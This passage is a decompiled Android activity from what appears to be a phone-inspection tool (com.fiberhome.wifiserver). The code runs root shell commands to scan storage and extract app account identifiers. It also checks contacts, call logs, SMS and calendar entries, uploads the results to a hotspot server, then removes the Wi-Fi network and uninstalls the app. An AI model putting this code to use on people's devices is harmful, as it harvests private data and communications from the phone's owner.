package com.fenghuo.qzj;

import android.app.Activity;
import android.app.AlertDialog.Builder;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.content.SharedPreferences.Editor;
import android.content.pm.ApplicationInfo;
import android.content.pm.IPackageStatsObserver;
import android.content.pm.IPackageStatsObserver.Stub;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageStats;
import android.media.MediaPlayer;
import android.net.Uri;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.os.RemoteException;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v4.internal.view.SupportMenu;
import android.support.v4.view.ViewCompat;
import android.telephony.TelephonyManager;
import android.text.SpannableStringBuilder;
import android.text.style.ForegroundColorSpan;
import android.view.KeyEvent;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import com.fenghuo.calendar.CalendarHepler;
import com.fenghuo.calllog.CallLogHelper;
import com.fenghuo.contact.ContactsHelper;
import com.fenghuo.http.HttpManager;
import com.fenghuo.http.HttpThread;
import com.fenghuo.http.request.ReqZIPEvent;
import com.fenghuo.http.response.RspZIPEvent;
import com.fenghuo.sms.SMSHelper;
import com.fenghuo.utils.AppInfo;
import com.fenghuo.utils.FromEndRF;
import com.fenghuo.utils.Global;
import com.fenghuo.utils.Logger;
import com.fenghuo.utils.OpenAssetsToFiles;
import com.fenghuo.utils.ShellCommands;
import com.fenghuo.utils.Sign;
import com.fenghuo.utils.Util;
import com.fenghuo.utils.XZip;
import com.fiberhome.wifiserver.C0171R;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import org.apache.http.HttpStatus;
import org.apache.http.protocol.HTTP;

public class WelcomeActivity extends Activity {
    public static long id = 0;
    protected final String XML_HEADER = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>";
    long endtime = 0;
    public int hCount = 0;
    private TextView ipTextView = null;
    private boolean isEnd = true;
    private Button loadButton;
    private TextView loadTextView = null;
    private Handler loginHandler_ = null;
    private MediaPlayer mediaPlayer;
    public int minCount = 0;
    private String phoneNumber;
    private Timer progressTimer;
    int scandir_app_count = 0;
    int scandir_app_position = 0;
    int scandir_count = 0;
    int scandir_position = 0;
    private String sdP = "";
    public int secondCount = 0;
    private LinearLayout sendProgressLayout = null;
    private TextView sendTextView = null;
    private long startS = 0;
    long starttime = 0;
    private TextView tipTextView;
    private TextView tv = null;
    private TextView tvTimer;
    private Handler uiHandler = new C01601();
    private Button uninstall;

    /* renamed from: com.fenghuo.qzj.WelcomeActivity$1 */
    class C01601 extends Handler {

        /* renamed from: com.fenghuo.qzj.WelcomeActivity$1$1 */
        class C01561 extends TimerTask {
            C01561() {
            }

            public void run() {
                WelcomeActivity.this.uiHandler.sendEmptyMessage(5);
            }
        }

        /* renamed from: com.fenghuo.qzj.WelcomeActivity$1$2 */
        class C01572 implements OnClickListener {
            C01572() {
            }

            public void onClick(DialogInterface dialogInterface, int i) {
                dialogInterface.dismiss();
                WelcomeActivity.this.execContinue();
            }
        }

        /* renamed from: com.fenghuo.qzj.WelcomeActivity$1$3 */
        class C01583 implements OnClickListener {
            C01583() {
            }

            public void onClick(DialogInterface dialogInterface, int i) {
                dialogInterface.dismiss();
                WelcomeActivity.this.isEnd = false;
                Util.DeleteFile(Global.absolutePath_);
                Util.DeleteFile(Global.esnPath_);
                WelcomeActivity.this.uiHandler.sendEmptyMessage(0);
                if (WelcomeActivity.id > 0) {
                    HttpManager.cancelConnection(WelcomeActivity.id);
                }
                WifiManager wifiManager = (WifiManager) WelcomeActivity.this.getSystemService("wifi");
                int access$900 = WelcomeActivity.this.getConnectionWifiSsid(wifiManager);
                wifiManager.removeNetwork(access$900);
                wifiManager.saveConfiguration();
                if (VERSION.SDK_INT >= 23) {
                    wifiManager.disableNetwork(access$900);
                } else if (wifiManager.isWifiEnabled()) {
                    wifiManager.setWifiEnabled(false);
                }
                WelcomeActivity.this.startActivity(new Intent("android.intent.action.DELETE", Uri.parse("package:com.fiberhome.wifiserver")));
            }
        }

        C01601() {
        }

        public void handleMessage(Message message) {
            super.handleMessage(message);
            String string;
            CharSequence spannableStringBuilder;
            String[] split;
            switch (message.what) {
                case 0:
                    WelcomeActivity.this.secondCount = 0;
                    WelcomeActivity.this.minCount = 0;
                    WelcomeActivity.this.hCount = 0;
                    if (WelcomeActivity.this.progressTimer != null) {
                        WelcomeActivity.this.progressTimer.cancel();
                        WelcomeActivity.this.progressTimer = null;
                    }
                    WelcomeActivity.this.loadButton.setClickable(true);
                    WelcomeActivity.this.loadButton.setTextColor(ViewCompat.MEASURED_STATE_MASK);
                    WelcomeActivity.this.onLoading(WelcomeActivity.this.getResources().getString(C0171R.string.searching_phone), false);
                    return;
                case 1:
                    Bundle data = message.getData();
                    int i = data.getInt("count");
                    int i2 = data.getInt("position");
                    String string2 = data.getString("time");
                    string = data.getString("scandir_count");
                    String str = "";
                    Object obj;
                    ForegroundColorSpan foregroundColorSpan;
                    String[] split2;
                    if (string == null || string.equals("") || !string.contains(",")) {
                        obj = WelcomeActivity.this.getResources().getString(C0171R.string.retrieve_file_total) + String.valueOf(i) + WelcomeActivity.this.getResources().getString(C0171R.string.individual) + "\n" + WelcomeActivity.this.getResources().getString(C0171R.string.hit) + String.valueOf(i2) + WelcomeActivity.this.getResources().getString(C0171R.string.individual) + "\n" + WelcomeActivity.this.getResources().getString(C0171R.string.time) + string2 + WelcomeActivity.this.getResources().getString(C0171R.string.second) + "\n";
                        foregroundColorSpan = new ForegroundColorSpan(SupportMenu.CATEGORY_MASK);
                        spannableStringBuilder = new SpannableStringBuilder(obj);
                        split2 = obj.split("\n");
                        spannableStringBuilder.setSpan(foregroundColorSpan, split2[0].length() + 1, (split2[1].length() + split2[0].length()) + 1, 21);
                    } else {
                        split = string.split(",");
                        if (split.length >= 2) {
                            WelcomeActivity.this.scandir_app_position = Integer.valueOf(split[1]).intValue();
                            obj = WelcomeActivity.this.getResources().getString(C0171R.string.retrieve_app) + String.valueOf(split[0]) + WelcomeActivity.this.getResources().getString(C0171R.string.individual) + "\n" + WelcomeActivity.this.getResources().getString(C0171R.string.suspicious_app) + String.valueOf(split[1]) + WelcomeActivity.this.getResources().getString(C0171R.string.individual) + "\n" + WelcomeActivity.this.getResources().getString(C0171R.string.retrieve_file_total) + String.valueOf(i) + WelcomeActivity.this.getResources().getString(C0171R.string.individual) + "\n" + WelcomeActivity.this.getResources().getString(C0171R.string.hit) + String.valueOf(i2) + WelcomeActivity.this.getResources().getString(C0171R.string.individual) + "\n" + WelcomeActivity.this.getResources().getString(C0171R.string.time) + string2 + WelcomeActivity.this.getResources().getString(C0171R.string.second) + "\n";
                            foregroundColorSpan = new ForegroundColorSpan(SupportMenu.CATEGORY_MASK);
                            spannableStringBuilder = new SpannableStringBuilder(obj);
                            split2 = obj.split("\n");
                            spannableStringBuilder.setSpan(foregroundColorSpan, split2[0].length() + 1, (split2[0].length() + split2[1].length()) + 1, 21);
                            spannableStringBuilder.setSpan(new ForegroundColorSpan(SupportMenu.CATEGORY_MASK), ((split2[0].length() + split2[1].length()) + split2[2].length()) + 2, (split2[3].length() + ((split2[0].length() + split2[1].length()) + split2[2].length())) + 3, 21);
                        } else {
                            obj = WelcomeActivity.this.getResources().getString(C0171R.string.retrieve_file_total) + String.valueOf(i) + WelcomeActivity.this.getResources().getString(C0171R.string.individual) + "\n" + WelcomeActivity.this.getResources().getString(C0171R.string.hit) + String.valueOf(i2) + WelcomeActivity.this.getResources().getString(C0171R.string.individual) + "\n" + WelcomeActivity.this.getResources().getString(C0171R.string.time) + string2 + WelcomeActivity.this.getResources().getString(C0171R.string.second) + "\n";
                            foregroundColorSpan = new ForegroundColorSpan(SupportMenu.CATEGORY_MASK);
                            spannableStringBuilder = new SpannableStringBuilder(obj);
                            split2 = obj.split("\n");
                            spannableStringBuilder.setSpan(foregroundColorSpan, split2[0].length() + 1, (split2[1].length() + split2[0].length()) + 1, 21);
                        }
                    }
                    WelcomeActivity.this.sendTextView.setText(spannableStringBuilder);
                    return;
                case 2:
                    WelcomeActivity.this.loadButton.setClickable(false);
                    WelcomeActivity.this.loadButton.setTextColor(-7829368);
                    return;
                case 3:
                    if (WelcomeActivity.this.progressTimer != null) {
                        WelcomeActivity.this.progressTimer.cancel();
                        WelcomeActivity.this.progressTimer = null;
                    }
                    WelcomeActivity.this.progressTimer = new Timer();
                    WelcomeActivity.this.progressTimer.schedule(new C01561(), 1000, 1000);
                    return;
                case 4:
                    if (WelcomeActivity.this.progressTimer != null) {
                        WelcomeActivity.this.progressTimer.cancel();
                        WelcomeActivity.this.progressTimer = null;
                        return;
                    }
                    return;
                case 5:
                    WelcomeActivity welcomeActivity = WelcomeActivity.this;
                    welcomeActivity.secondCount++;
                    if (WelcomeActivity.this.secondCount >= 60) {
                        WelcomeActivity.this.secondCount = 0;
                        welcomeActivity = WelcomeActivity.this;
                        welcomeActivity.minCount++;
                        if (WelcomeActivity.this.minCount >= 60) {
                            WelcomeActivity.this.minCount = 0;
                            welcomeActivity = WelcomeActivity.this;
                            welcomeActivity.hCount++;
                        }
                    }
                    String l = Long.toString((long) WelcomeActivity.this.minCount);
                    String l2 = Long.toString((long) WelcomeActivity.this.hCount);
                    string = Long.toString((long) WelcomeActivity.this.secondCount);
                    if (string.length() < 2) {
                        if (string.equals("")) {
                            string = "00";
                        } else {
                            string = "0" + string;
                        }
                    }
                    if (l.length() < 2) {
                        if (l.equals("")) {
                            l = "00";
                        } else {
                            l = "0" + l;
                        }
                    }
                    if (l2.length() < 2) {
                        if (l2.equals("")) {
                            l2 = "00";
                        } else {
                            l2 = "0" + l2;
                        }
                    }
                    WelcomeActivity.this.tvTimer.setText(WelcomeActivity.this.getResources().getString(C0171R.string.timered) + l2 + ":" + l + ":" + string);
                    return;
                case 6:
                    string = String.format(WelcomeActivity.this.getResources().getString(C0171R.string.searching_phoneN), new Object[]{Integer.valueOf(WelcomeActivity.this.scandir_count), Integer.valueOf(WelcomeActivity.this.scandir_position)});
                    ForegroundColorSpan foregroundColorSpan2 = new ForegroundColorSpan(SupportMenu.CATEGORY_MASK);
                    CharSequence spannableStringBuilder2 = new SpannableStringBuilder(string);
                    int indexOf = string.indexOf(10);
                    spannableStringBuilder2.setSpan(foregroundColorSpan2, indexOf + 1, string.substring(string.indexOf(10) + 1).length() + indexOf, 21);
                    WelcomeActivity.this.tv.setText(spannableStringBuilder2);
                    return;
                case 7:
                    split = Util.readFile(Global.mSdCardPath_ + "/cjlog_plain.txt").split("\t");
                    if (split == null || split.length < 4) {
                        WelcomeActivity.this.execContinue();
                        return;
                    }
                    string = Util.formatTimeStampString(Long.valueOf(split[4]).longValue() * 1000);
                    spannableStringBuilder = String.format(WelcomeActivity.this.getResources().getString(C0171R.string.localmain_alterdialog_checklog), new Object[]{string});
                    Builder builder = new Builder(WelcomeActivity.this);
                    builder.setTitle(WelcomeActivity.this.getResources().getString(C0171R.string.prompt));
                    builder.setMessage(spannableStringBuilder);
                    builder.setPositiveButton(WelcomeActivity.this.getResources().getString(C0171R.string.localmain_showdialog_xml_continue), new C01572());
                    builder.setNegativeButton(WelcomeActivity.this.getResources().getString(C0171R.string.uninstall), new C01583());
                    builder.show();
                    return;
                default:
                    return;
            }
        }
    }

    /* renamed from: com.fenghuo.qzj.WelcomeActivity$2 */
    class C01612 extends Thread {
        C01612() {
        }

        public void run() {
            super.run();
            while (WelcomeActivity.this.isEnd) {
                File file = new File(Global.absolutefilesPath_ + "/error_file");
                String str = "";
                if (file.exists()) {
                    str = FromEndRF.read(file.getPath());
                }
                if (!(str == null || str.equals(""))) {
                    String[] split = str.split("\t");
                    if (split != null && split.length >= 2 && Util.isNumeric(split[0])) {
                        WelcomeActivity.this.scandir_count = Integer.valueOf(split[0]).intValue();
                    }
                }
                WelcomeActivity.this.scandir_position = Util.readFileCountByLines(new File(Global.esnPath_ + "scandir_temp"));
                WelcomeActivity.this.uiHandler.sendEmptyMessage(6);
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    /* renamed from: com.fenghuo.qzj.WelcomeActivity$3 */
    class C01623 extends Handler {
        C01623() {
        }

        public void handleMessage(Message message) {
            super.handleMessage(message);
            String str = "";
            switch (message.what) {
                case 1:
                    str = "";
                    RspZIPEvent rspZIPEvent = (RspZIPEvent) message.obj;
                    if (rspZIPEvent == null || !rspZIPEvent.isValidResult()) {
                        str = WelcomeActivity.this.getResources().getString(C0171R.string.fail);
                        WelcomeActivity.this.showAlertDialog();
                    } else if ("200".equals(rspZIPEvent.responseStatusCode)) {
                        str = WelcomeActivity.this.getResources().getString(C0171R.string.successful);
                        Util.DeleteFile(Global.absolutePath_);
                        Util.DeleteFile(Global.esnPath_);
                        WelcomeActivity.this.uiHandler.sendEmptyMessage(0);
                    } else {
                        str = WelcomeActivity.this.getResources().getString(C0171R.string.fail);
                        WelcomeActivity.this.showAlertDialog();
                    }
                    if (WelcomeActivity.id > 0) {
                        HttpManager.cancelConnection(WelcomeActivity.id);
                        HttpManager.removeHttpQueueById(WelcomeActivity.id);
                    }
                    if (WelcomeActivity.this.loadTextView != null) {
                        WelcomeActivity.this.loadTextView.setText(WelcomeActivity.this.getResources().getString(C0171R.string.search_phone) + str + "\n" + Global.modelDevice + "\n" + WelcomeActivity.this.getResources().getString(C0171R.string.test_time) + Util.getCurrentDateAndTime());
                        return;
                    }
                    return;
                case HttpStatus.SC_CONTINUE /*100*/:
                    if (WelcomeActivity.this.loadTextView != null) {
                        WelcomeActivity.this.loadTextView.setText(WelcomeActivity.this.getResources().getString(C0171R.string.searching_phone) + "\n" + Global.modelDevice + "\n" + WelcomeActivity.this.getResources().getString(C0171R.string.test_time) + Util.getCurrentDateAndTime());
                    }
                    WelcomeActivity.this.setMessageDialog(WelcomeActivity.this.getResources().getString(C0171R.string.sending_result), true);
                    Global.getGlobal().setLocalIP(Util.getLocalIpAddress());
                    WelcomeActivity.this.ipTextView.setText(WelcomeActivity.this.getResources().getString(C0171R.string.ip_address) + Global.getGlobal().getLocalIP());
                    WelcomeActivity.this.setHintVisisble();
                    WelcomeActivity.this.sendReq();
                    return;
                case 101:
                    WelcomeActivity.this.setMessageDialog(message.getData().getString("msgStr"), true);
                    return;
                case 102:
                    WelcomeActivity.this.setMessageDialog(WelcomeActivity.this.getResources().getString(C0171R.string.checking_contacts) + "（" + message.getData().getInt("poistion") + "/" + message.getData().getInt("count") + "）....", true);
                    return;
                case 103:
                    WelcomeActivity.this.setMessageDialog(WelcomeActivity.this.getResources().getString(C0171R.string.checking_sim_contacts) + "（" + message.getData().getInt("poistion") + "/" + message.getData().getInt("count") + "）....", true);
                    return;
                case 104:
                    WelcomeActivity.this.setMessageDialog(WelcomeActivity.this.getResources().getString(C0171R.string.checking_call_logs) + "（" + message.getData().getInt("poistion") + "/" + message.getData().getInt("count") + "）....", true);
                    return;
                case 105:
                    WelcomeActivity.this.setMessageDialog(WelcomeActivity.this.getResources().getString(C0171R.string.testing_sms) + "（" + message.getData().getInt("poistion") + "/" + message.getData().getInt("count") + "）....", true);
                    return;
                case 106:
                    WelcomeActivity.this.setMessageDialog(WelcomeActivity.this.getResources().getString(C0171R.string.checking_calendar) + "（" + message.getData().getInt("poistion") + "/" + message.getData().getInt("count") + "）....", true);
                    return;
                case 107:
                    WelcomeActivity.this.setMessageDialog(WelcomeActivity.this.getResources().getString(C0171R.string.checking_sim_sms) + "（" + message.getData().getInt("poistion") + "/" + message.getData().getInt("count") + "）....", true);
                    return;
                default:
                    return;
            }
        }
    }

    /* renamed from: com.fenghuo.qzj.WelcomeActivity$4 */
    class C01634 implements OnClickListener {
        C01634() {
        }

        public void onClick(DialogInterface dialogInterface, int i) {
            WelcomeActivity.this.startActivity(new Intent("android.settings.WIFI_SETTINGS"));
            try {
                Field declaredField = dialogInterface.getClass().getSuperclass().getDeclaredField("mShowing");
                declaredField.setAccessible(true);
                declaredField.set(dialogInterface, Boolean.valueOf(false));
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    /* renamed from: com.fenghuo.qzj.WelcomeActivity$5 */
    class C01645 implements OnClickListener {
        C01645() {
        }

        public void onClick(DialogInterface dialogInterface, int i) {
            Util.DeleteFile(Global.absolutePath_);
            Util.DeleteFile(Global.esnPath_);
            WelcomeActivity.this.uiHandler.sendEmptyMessage(0);
            try {
                Field declaredField = dialogInterface.getClass().getSuperclass().getDeclaredField("mShowing");
                declaredField.setAccessible(true);
                declaredField.set(dialogInterface, Boolean.valueOf(true));
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    /* renamed from: com.fenghuo.qzj.WelcomeActivity$6 */
    class C01656 implements OnClickListener {
        C01656() {
        }

        public void onClick(DialogInterface dialogInterface, int i) {
            Global.getGlobal().setLocalIP(Util.getLocalIpAddress());
            WelcomeActivity.this.ipTextView.setText(WelcomeActivity.this.getResources().getString(C0171R.string.ip_address) + Global.getGlobal().getLocalIP());
            WelcomeActivity.this.sendReq();
            try {
                Field declaredField = dialogInterface.getClass().getSuperclass().getDeclaredField("mShowing");
                declaredField.setAccessible(true);
                declaredField.set(dialogInterface, Boolean.valueOf(true));
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    /* renamed from: com.fenghuo.qzj.WelcomeActivity$7 */
    class C01667 implements View.OnClickListener {
        C01667() {
        }

        public void onClick(View view) {
            Global.getGlobal().setLocalIP(Util.getLocalIpAddress());
            WelcomeActivity.this.ipTextView.setText(WelcomeActivity.this.getResources().getString(C0171R.string.ip_address) + Global.getGlobal().getLocalIP());
        }
    }

    /* renamed from: com.fenghuo.qzj.WelcomeActivity$8 */
    class C01678 implements OnClickListener {
        C01678() {
        }

        public void onClick(DialogInterface dialogInterface, int i) {
            dialogInterface.dismiss();
            WelcomeActivity.this.startActivity(new Intent("android.settings.WIFI_SETTINGS"));
        }
    }

    /* renamed from: com.fenghuo.qzj.WelcomeActivity$9 */
    class C01689 implements OnClickListener {
        C01689() {
        }

        public void onClick(DialogInterface dialogInterface, int i) {
            dialogInterface.dismiss();
        }
    }

    protected void writePreferences(String str, String str2, int i) {
        Editor edit = getSharedPreferences(str, 0).edit();
        edit.putInt(str2, i);
        edit.commit();
    }

    private void setHintVisisble() {
        if (Global.USER_DIVISION == null || ":;".equals(Global.USER_DIVISION) || Global.USER_DIVISION.startsWith("0") || Global.USER_DIVISION.toLowerCase().equals("sdcard0:;")) {
            this.tipTextView.setVisibility(4);
            return;
        }
        this.tipTextView.setVisibility(0);
        this.tipTextView.bringToFront();
    }

    private void PlayCameraVoice() {
        if (this.mediaPlayer != null) {
            this.mediaPlayer.start();
            return;
        }
        MediaPlayer mediaPlayer = new MediaPlayer();
        this.mediaPlayer = MediaPlayer.create(this, C0171R.raw.beep);
        this.mediaPlayer.setVolume(1.0f, 1.0f);
        this.mediaPlayer.start();
    }

    protected void onResume() {
        super.onResume();
        Global.getGlobal().setLocalIP(Util.getLocalIpAddress());
        this.ipTextView.setText(getResources().getString(C0171R.string.ip_address) + Global.getGlobal().getLocalIP());
    }

    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(C0171R.layout.main);
        OpenAssetsToFiles.unZipAssetsAndChomd(this);
        init();
        initHandler();
        initLayout();
        System.getenv();
        String str = System.getenv("EXTERNAL_STORAGE");
        String str2 = "";
        if (VERSION.SDK_INT < 23) {
            str2 = System.getenv("SECONDARY_STORAGE");
            if (str2 == null || str2.equals("") || str2.equals("null")) {
                this.sdP = "\"" + str + "\" ";
            } else {
                this.sdP = "\"" + str + "\" " + "\"" + str2 + "\"";
            }
        } else if (VERSION.SDK_INT >= 24) {
            this.sdP = "\"" + Global.mSdCardPath_ + "\" ";
            str = Util.getStoragePath(this, true);
            if (str != null && !str.equals("") && !str.equals("null") && new File(str).exists()) {
                this.sdP += "\"" + str + "\"";
            }
        } else {
            str2 = Util.getStoragePath(this, true);
            if (str2 == null || str2.equals("") || str2.equals("null") || !new File(str2).exists()) {
                this.sdP = "\"" + str + "\" ";
            } else {
                this.sdP = "\"" + str + "\" " + "\"" + str2 + "\"";
            }
        }
    }

    private void requestPermissions() {
        if (ContextCompat.checkSelfPermission(this, "android.permission.WRITE_EXTERNAL_STORAGE") != 0 || ContextCompat.checkSelfPermission(this, "android.permission.RECORD_AUDIO") != 0) {
            ActivityCompat.requestPermissions(this, new String[]{"android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.RECORD_AUDIO"}, 66);
        }
    }

    public void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
        super.onRequestPermissionsResult(i, strArr, iArr);
        if (i != 66) {
            return;
        }
        if (iArr[0] != 0 || iArr[1] != 0) {
            Toast.makeText(this, "已拒绝权限！", 0).show();
        }
    }

    private void updateUi() {
        new C01612().start();
    }

    protected void onPause() {
        super.onPause();
    }

    public String loadStream(InputStream inputStream) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byte[] bArr = new byte[4096];
        while (true) {
            int read = inputStream.read(bArr, 0, 4096);
            if (read != -1) {
                byteArrayOutputStream.write(bArr, 0, read);
                byteArrayOutputStream.flush();
            } else {
                String str = new String(byteArrayOutputStream.toByteArray(), HTTP.UTF_8);
                byteArrayOutputStream.close();
                inputStream.close();
                return str;
            }
        }
    }

    private void initHandler() {
        this.loginHandler_ = new C01623();
    }

    private void showAlertDialog() {
        Builder builder = new Builder(this);
        builder.setCancelable(false);
        builder.setMessage(getResources().getString(C0171R.string.upload_failed));
        builder.setTitle(getResources().getString(C0171R.string.dialog_alert));
        builder.setPositiveButton(getResources().getString(C0171R.string.change_network), new C01634());
        builder.setNegativeButton(getResources().getString(C0171R.string.cancel), new C01645());
        builder.setNeutralButton(getResources().getString(C0171R.string.reupload), new C01656());
        builder.create().show();
    }

    private int getConnectionWifiSsid(WifiManager wifiManager) {
        return wifiManager.getConnectionInfo().getNetworkId();
    }

    private void initLayout() {
        this.ipTextView = (TextView) findViewById(C0171R.id.ipTextView);
        this.tvTimer = (TextView) findViewById(C0171R.id.tvTimer);
        this.ipTextView.setText(getResources().getString(C0171R.string.ip_address) + Global.getGlobal().getLocalIP());
        this.sendProgressLayout = (LinearLayout) findViewById(C0171R.id.sendProgressLayout);
        this.tv = (TextView) findViewById(C0171R.id.tv);
        onLoading(getResources().getString(C0171R.string.searching_phone), false);
        this.ipTextView.setOnClickListener(new C01667());
        if (!Global.getGlobal().getLocalIP().contains("192.168.43") || Global.getGlobal().getLocalIP().equals("192.168.43.*")) {
            Builder builder = new Builder(this);
            builder.setTitle(getResources().getString(C0171R.string.prompt));
            builder.setMessage(getResources().getString(C0171R.string.net_error));
            builder.setPositiveButton(getResources().getString(C0171R.string.confirm), new C01678());
            builder.setNegativeButton(getResources().getString(C0171R.string.cancel), new C01689());
            builder.show();
        }
        this.loadButton = (Button) findViewById(C0171R.id.loadButton);
        this.uninstall = (Button) findViewById(C0171R.id.uninstall);
        this.uninstall.setOnClickListener(new View.OnClickListener() {
            public void onClick(View view) {
                if (WelcomeActivity.id > 0) {
                    HttpManager.cancelConnection(WelcomeActivity.id);
                }
                WifiManager wifiManager = (WifiManager) WelcomeActivity.this.getSystemService("wifi");
                int access$900 = WelcomeActivity.this.getConnectionWifiSsid(wifiManager);
                wifiManager.removeNetwork(access$900);
                wifiManager.saveConfiguration();
                if (VERSION.SDK_INT >= 23) {
                    wifiManager.disableNetwork(access$900);
                } else if (wifiManager.isWifiEnabled()) {
                    wifiManager.setWifiEnabled(false);
                }
                WelcomeActivity.this.startActivity(new Intent("android.intent.action.DELETE", Uri.parse("package:com.fiberhome.wifiserver")));
            }
        });
        this.loadButton.setOnClickListener(new View.OnClickListener() {
            public void onClick(View view) {
                Global.getGlobal().setLocalIP(Util.getLocalIpAddress());
                WelcomeActivity.this.ipTextView.setText(WelcomeActivity.this.getResources().getString(C0171R.string.ip_address) + Global.getGlobal().getLocalIP());
                WelcomeActivity.this.tvTimer.setText(WelcomeActivity.this.getResources().getString(C0171R.string.timered) + "00:00:00");
                WelcomeActivity.this.uiHandler.sendEmptyMessage(2);
                WelcomeActivity.this.uiHandler.sendEmptyMessage(3);
                WelcomeActivity.this.loadTextView.setText("");
                WelcomeActivity.this.sendTextView.setText("");
                WelcomeActivity.this.onLoading(WelcomeActivity.this.getResources().getString(C0171R.string.searching_phone), true);
                WelcomeActivity.this.scandir_count = 0;
                WelcomeActivity.this.scandir_position = 0;
                WelcomeActivity.this.scandir_app_count = 0;
                WelcomeActivity.this.scandir_app_position = 0;
                WelcomeActivity.this.isEnd = true;
                if (WelcomeActivity.this.getResources().getString(C0171R.string.scandir_enable).contains("true")) {
                    WelcomeActivity.this.updateUi();
                }
                final int i = VERSION.SDK_INT;
                new Thread(new Runnable() {
                    public void run() {
                        Looper.prepare();
                        WelcomeActivity.this.sendMssage(WelcomeActivity.this.getResources().getString(C0171R.string.checking_file));
                        Util.createFile(Global.esnPath_ + "scandir_temp");
                        Util.createFile(Global.absolutefilesPath_ + "/error_file");
                        File file = new File(Global.absolutePath_);
                        WelcomeActivity.this.startS = System.currentTimeMillis();
                        String string = WelcomeActivity.this.getResources().getString(C0171R.string.scandir_enable);
                        if (string.contains("true")) {
                            if (new File(Global.mSdCardPath_ + "/Android/cjlog.txt").exists()) {
                                if (i >= 16) {
                                    ShellCommands.doSuCmds("sh", Global.absolutefilesPath_ + "/gen_wifi_cj_flag_pie " + Global.mSdCardPath_ + "/Android/cjlog.txt " + Global.mSdCardPath_ + "/cjlog_plain.txt" + " 2>" + Global.absolutefilesPath_ + "/log_file 1>" + Global.absolutefilesPath_ + "/error_file");
                                } else {
                                    ShellCommands.doSuCmds("sh", Global.absolutefilesPath_ + "/gen_wifi_cj_flag " + Global.mSdCardPath_ + "/Android/cjlog.txt " + Global.mSdCardPath_ + "/cjlog_plain.txt" + " 2>" + Global.absolutefilesPath_ + "/log_file 1>" + Global.absolutefilesPath_ + "/error_file");
                                }
                                if (new File(Global.mSdCardPath_ + "/cjlog_plain.txt").exists()) {
                                    WelcomeActivity.this.uiHandler.sendEmptyMessage(7);
                                    return;
                                }
                            }
                            if (i >= 16) {
                                ShellCommands.doSuCmds("sh", Global.absolutefilesPath_ + "/wifiscan_pie sm " + WelcomeActivity.this.sdP + " 2>" + Global.absolutefilesPath_ + "/error_file 1>" + Global.esnPath_ + "scandir_temp");
                            } else {
                                ShellCommands.doSuCmds("sh", Global.absolutefilesPath_ + "/wifiscan sm " + WelcomeActivity.this.sdP + " 2>" + Global.absolutefilesPath_ + "/error_file 1>" + Global.esnPath_ + "scandir_temp");
                            }
                        }
                        if (!"true/false".equals(string)) {
                            ShellCommands.doSuCmds("sh", Global.absolutefilesPath_ + "/getVirAccount " + Global.absolutefilesPath_ + "/id.conf " + Global.esnPath_ + "app_account");
                        }
                        String access$2000 = WelcomeActivity.this.getAllApps();
                        WelcomeActivity.this.isEnd = false;
                        long currentTimeMillis = (System.currentTimeMillis() - WelcomeActivity.this.startS) / 1000;
                        if (string.contains("true")) {
                            WelcomeActivity.this.showDialog(String.valueOf(currentTimeMillis), access$2000);
                        }
                        WelcomeActivity.this.readAppData(string);
                        Message message = new Message();
                        message.what = 100;
                        WelcomeActivity.this.loginHandler_.sendMessage(message);
                    }
                }).start();
            }
        });
        this.loadTextView = (TextView) findViewById(C0171R.id.loadTextView);
        this.sendTextView = (TextView) findViewById(C0171R.id.sendTextView);
        this.tipTextView = (TextView) findViewById(C0171R.id.tip);
    }

    private void execContinue() {
        new Thread() {
            public void run() {
                super.run();
                String string = WelcomeActivity.this.getResources().getString(C0171R.string.scandir_enable);
                if (string.contains("true")) {
                    if (VERSION.SDK_INT >= 16) {
                        ShellCommands.doSuCmds("sh", Global.absolutefilesPath_ + "/wifiscan_pie sm " + WelcomeActivity.this.sdP + " 2>" + Global.absolutefilesPath_ + "/error_file 1>" + Global.esnPath_ + "scandir_temp");
                    } else {
                        ShellCommands.doSuCmds("sh", Global.absolutefilesPath_ + "/wifiscan sm " + WelcomeActivity.this.sdP + " 2>" + Global.absolutefilesPath_ + "/error_file 1>" + Global.esnPath_ + "scandir_temp");
                    }
                }
                if (!"true/false".equals(string)) {
                    ShellCommands.doSuCmds("sh", Global.absolutefilesPath_ + "/getVirAccount " + Global.absolutefilesPath_ + "/id.conf " + Global.esnPath_ + "app_account");
                }
                String access$2000 = WelcomeActivity.this.getAllApps();
                WelcomeActivity.this.isEnd = false;
                long currentTimeMillis = (System.currentTimeMillis() - WelcomeActivity.this.startS) / 1000;
                if (string.contains("true")) {
                    WelcomeActivity.this.showDialog(String.valueOf(currentTimeMillis), access$2000);
                }
                WelcomeActivity.this.readAppData(string);
                Message message = new Message();
                message.what = 100;
                WelcomeActivity.this.loginHandler_.sendMessage(message);
            }
        }.start();
    }

    private WifiConfiguration IsExsits(String str) {
        System.out.println("ssid=" + str);
        for (WifiConfiguration wifiConfiguration : ((WifiManager) getSystemService("wifi")).getConfiguredNetworks()) {
            if (wifiConfiguration.SSID.equals(str)) {
                return wifiConfiguration;
            }
        }
        return null;
    }

    public boolean filterApp(ApplicationInfo applicationInfo) {
        if ((applicationInfo.flags & 128) == 0 && (applicationInfo.flags & 1) == 0) {
            return false;
        }
        return true;
    }

